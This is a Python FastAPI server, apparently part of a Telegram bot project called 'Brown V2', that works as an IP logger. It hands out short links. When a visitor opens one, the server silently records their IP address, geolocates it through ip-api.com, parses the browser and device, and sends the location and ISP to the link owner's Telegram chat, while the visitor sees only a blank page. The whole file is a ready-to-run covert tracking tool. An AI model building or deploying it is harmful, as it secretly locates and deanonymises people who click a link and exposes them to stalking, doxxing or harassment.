# coding: utf-8
"""
Brown V2 | logger_server.py
IP-логгер — FastAPI сервер.
Порт: 8080
Каждый переход по ссылке br-v2.online/XXXXXX → логируем → шлём в бот.
"""

import asyncio
import os
import random
import string
from datetime import datetime

import aiohttp
from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
from fastapi.staticfiles import StaticFiles
import uvicorn

# ─── Конфиг ──────────────────────────────────────────────────────────────────
# Словарь: short_id -> (owner_user_id, bot_token)
_links: dict[str, tuple[int, str]] = {}

app = FastAPI()

# Статика для мануала
import os as _os
_os.makedirs("static", exist_ok=True)
app.mount("/static", StaticFiles(directory="static"), name="static")


def _generate_id(length: int = 6) -> str:
    chars = string.ascii_lowercase + string.digits
    while True:
        uid = ''.join(random.choices(chars, k=length))
        if uid not in _links:
            return uid


async def _get_ip_info(ip: str) -> dict:
    """Получает информацию об IP через ip-api.com (бесплатно, без ключа)."""
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(
                f"http://ip-api.com/json/{ip}?lang=ru&fields=status,country,regionName,city,isp,org",
                timeout=aiohttp.ClientTimeout(total=5)
            ) as resp:
                data = await resp.json(content_type=None)
                if data.get("status") == "success":
                    return data
    except Exception:
        pass
    return {}


def _parse_ua(ua: str) -> tuple[str, str, str]:
    """Парсит User-Agent, возвращает (устройство, ОС, браузер)."""
    ua_lower = ua.lower()

    # Браузер
    if "edg/" in ua_lower or "edge/" in ua_lower:
        browser = "Edge"
    elif "opr/" in ua_lower or "opera/" in ua_lower:
        browser = "Opera"
    elif "chrome/" in ua_lower and "chromium" not in ua_lower:
        browser = "Chrome"
    elif "firefox/" in ua_lower:
        browser = "Firefox"
    elif "safari/" in ua_lower and "chrome" not in ua_lower:
        browser = "Safari"
    elif "yabrowser/" in ua_lower:
        browser = "Яндекс Браузер"
    else:
        browser = "Неизвестно"

    # ОС
    if "iphone" in ua_lower:
        os_name = "iOS (iPhone)"
        device = "📱 iPhone"
    elif "ipad" in ua_lower:
        os_name = "iOS (iPad)"
        device = "📱 iPad"
    elif "android" in ua_lower:
        # Пытаемся вытащить версию
        try:
            android_ver = ua.split("Android ")[1].split(";")[0]
            os_name = f"Android {android_ver}"
        except Exception:
            os_name = "Android"
        device = "📱 Android"
    elif "windows" in ua_lower:
        if "windows nt 10" in ua_lower:
            os_name = "Windows 10/11"
        elif "windows nt 6.1" in ua_lower:
            os_name = "Windows 7"
        else:
            os_name = "Windows"
        device = "🖥 ПК"
    elif "macintosh" in ua_lower or "mac os" in ua_lower:
        os_name = "macOS"
        device = "🖥 Mac"
    elif "linux" in ua_lower:
        os_name = "Linux"
        device = "🖥 Linux"
    else:
        os_name = "Неизвестно"
        device = "❓ Устройство"

    return device, os_name, browser


async def _notify_owner(owner_id: int, short_id: str, ip: str, ua: str,
                         referer: str, ip_info: dict, bot_token: str = ""):
    """Отправляет уведомление владельцу ссылки через Telegram Bot API."""
    if not bot_token:
        return

    device, os_name, browser = _parse_ua(ua)
    now_str = datetime.utcnow().strftime("%d.%m.%Y %H:%M") + " UTC"

    country = ip_info.get("country", "—")
    region = ip_info.get("regionName", "")
    city = ip_info.get("city", "")
    isp = ip_info.get("isp", "—")

    location = ", ".join(filter(None, [country, region, city])) or "—"

    ref_line = f"\n🔗 *Реферер:* `{referer[:80]}`" if referer and referer != "—" else ""

    text = (
        f"🎯 *Логгер сработал!*\n\n"
        f"🔑 *Ссылка:* `br-v2.online/{short_id}`\n\n"
        f"🕐 *Время:* `{now_str}`\n"
        f"🌐 *IP:* `{ip}`\n"
        f"🏳 *Локация:* `{location}`\n"
        f"📡 *Провайдер:* `{isp}`\n"
        f"{device} *Устройство:* `{os_name}`\n"
        f"🌍 *Браузер:* `{browser}`"
        f"{ref_line}"
    )

    try:
        async with aiohttp.ClientSession() as session:
            await session.post(
                f"https://api.telegram.org/bot{bot_token}/sendMessage",
                json={
                    "chat_id": owner_id,
                    "text": text,
                    "parse_mode": "Markdown"
                },
                timeout=aiohttp.ClientTimeout(total=10)
            )
    except Exception as e:
        print(f"[LOGGER] Ошибка отправки уведомления: {e}", flush=True)


# ─── Endpoints ────────────────────────────────────────────────────────────────

@app.get("/create/{owner_id}")
async def create_link(owner_id: int, token: str = ""):
    """Внутренний endpoint — вызывается ботом для создания ссылки."""
    short_id = _generate_id()
    _links[short_id] = (owner_id, token)
    return {"short_id": short_id, "url": f"https://br-v2.online/{short_id}"}


@app.get("/{short_id}")
async def handle_log(short_id: str, request: Request):
    """Обрабатывает переход по ссылке."""
    owner_data = _links.get(short_id)
    owner_id = owner_data[0] if owner_data else None
    bot_token = owner_data[1] if owner_data else ""

    # Получаем реальный IP (учитываем прокси/CDN)
    forwarded = request.headers.get("X-Forwarded-For")
    if forwarded:
        ip = forwarded.split(",")[0].strip()
    else:
        ip = request.client.host

    ua = request.headers.get("User-Agent", "—")
    referer = request.headers.get("Referer", "—")

    print(f"[LOGGER] Переход: /{short_id} | IP: {ip} | UA: {ua[:60]}", flush=True)

    if owner_id:
        ip_info = await _get_ip_info(ip)
        asyncio.ensure_future(_notify_owner(owner_id, short_id, ip, ua, referer, ip_info, bot_token))

    # Возвращаем пустую страницу
    return HTMLResponse(content="", status_code=200)


@app.get("/manual")
async def manual_page():
    """Страница мануала."""
    html = """<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Мануал Brown V2</title>
<style>
  body { margin: 0; background: #1a1a2e; display: flex; justify-content: center; align-items: flex-start; min-height: 100vh; padding: 20px; box-sizing: border-box; }
  img { max-width: 100%; width: 680px; border-radius: 12px; box-shadow: 0 4px 30px rgba(0,0,0,0.5); }
</style>
</head>
<body>
  <img src="/static/manual.png" alt="Мануал Brown V2">
</body>
</html>"""
    return HTMLResponse(content=html, status_code=200)


@app.get("/")
async def root():
    return HTMLResponse(content="", status_code=404)


# ─── Запуск ───────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8080)
